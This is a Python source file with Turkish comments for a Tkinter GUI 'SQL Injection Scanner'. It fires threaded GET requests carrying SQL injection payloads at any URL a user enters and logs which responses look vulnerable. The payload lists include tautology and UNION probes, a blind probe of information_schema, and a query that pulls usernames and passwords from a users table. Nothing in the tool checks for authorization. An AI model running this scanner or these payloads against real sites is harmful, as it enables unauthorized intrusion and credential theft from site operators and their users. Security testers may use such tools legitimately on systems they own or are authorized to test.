import tkinter as tk
from tkinter import messagebox
import requests  # HTTP istekleri göndermek
import re  # URL'nin geçerli olup olmadığını kontrol etmek için regex
import json  # Sonuçları JSON formatında kaydetmek
import threading  # Paralel işlemler için threading
from datetime import datetime  # Zaman damgası eklemek için

def is_valid_url(url):
    """URL'nin geçerli olup olmadığını kontrol eder."""
    regex = re.compile(
        r'^(https?:\/\/)?'  # http:// veya https://
        r'((([a-zA-Z\d]([a-zA-Z\d-]*[a-zA-Z\d])*)\.)+[a-zA-Z]{2,}|'  # domain...
        r'localhost|'  # ...veya localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...veya IPv4...
        r'\[([a-fA-F\d:.]+)\])'  # ...veya IPv6
        r'(:\d+)?(\/[-a-zA-Z\d%_.~+]*)*'  # port ve path
        r'(\?[;&a-zA-Z\d%_.~+=-]*)?'  # query string
        r'(\#[-a-zA-Z\d_]*)?$', re.IGNORECASE)
    return re.match(regex, url) is not None

def test_sql_injection(url, payload):
    """SQL Injection testi için verilen URL üzerinde payload'ları test eder."""
    try:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url, timeout=5)
        if "SQL syntax" in response.text or response.status_code == 500:
            return {"payload": payload, "status": "vulnerable", "url": test_url, "status_code": response.status_code}
        else:
            return {"payload": payload, "status": "safe", "url": test_url, "status_code": response.status_code}
    except requests.RequestException as e:
        return {"payload": payload, "status": "error", "url": url, "error": str(e)}

def save_results_to_json(results):
    """Test sonuçlarını JSON dosyasına kaydeder."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"test_results_{timestamp}.json"
    with open(filename, "w") as file:
        json.dump(results, file, indent=4)
    return filename

def run_tests(url, payloads):
    """Aynı anda birden fazla URL üzerinde SQL Injection testi yapar."""
    results = []
    threads = []

    def test_and_append(payload):
        result = test_sql_injection(url, payload)
        results.append(result)

    for payload in payloads:
        thread = threading.Thread(target=test_and_append, args=(payload,))
        threads.append(thread)
        thread.start()

    # Tüm thread'ler bitene kadar bekle
    for thread in threads:
        thread.join()

    return results

def gui_run_tests():
    """GUI'de SQL Injection testlerini başlatır ve sonuçları gösterir."""
    url = url_entry.get()
    if not is_valid_url(url):
        messagebox.showerror("Hata", "Geçerli bir URL girin!")
        return

    level = test_level.get()
    payloads = basic_payloads if level == "basic" else advanced_payloads

    messagebox.showinfo("Bilgi", f"{level.capitalize()} seviyesinde testler başlatılıyor...")
    results = run_tests(url, payloads)
    
    # Sonuçları kaydet
    json_file = save_results_to_json(results)

    # GUI'de sonuçları görüntüle
    result_text = "\n".join([f"Payload: {r['payload']}, Status: {r['status']}" for r in results])
    result_text += f"\n\nSonuçlar {json_file} dosyasına kaydedildi."
    messagebox.showinfo("Test Sonuçları", result_text)

# Payload listeleri
basic_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT null, null --",
    "1' OR '1'='1"
]

advanced_payloads = [
    "' AND 1=2 UNION SELECT null, version() --",
    "' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64 --",
    "' UNION ALL SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --"
]

# GUI oluşturma
root = tk.Tk()
root.title("SQL Injection Scanner")

frame = tk.Frame(root, padx=10, pady=10)
frame.pack(padx=10, pady=10)

url_label = tk.Label(frame, text="Test Edilecek URL:")
url_label.grid(row=0, column=0, sticky="w")
url_entry = tk.Entry(frame, width=50)
url_entry.grid(row=0, column=1, pady=5)

test_level_label = tk.Label(frame, text="Test Seviyesi:")
test_level_label.grid(row=1, column=0, sticky="w")

test_level = tk.StringVar(value="basic")

basic_radio = tk.Radiobutton(frame, text="Temel", variable=test_level, value="basic")
basic_radio.grid(row=1, column=1, sticky="w")

advanced_radio = tk.Radiobutton(frame, text="İleri", variable=test_level, value="advanced")
advanced_radio.grid(row=2, column=1, sticky="w")

run_button = tk.Button(frame, text="Test Başlat", command=gui_run_tests)
run_button.grid(row=3, column=0, columnspan=2, pady=10)

root.mainloop()
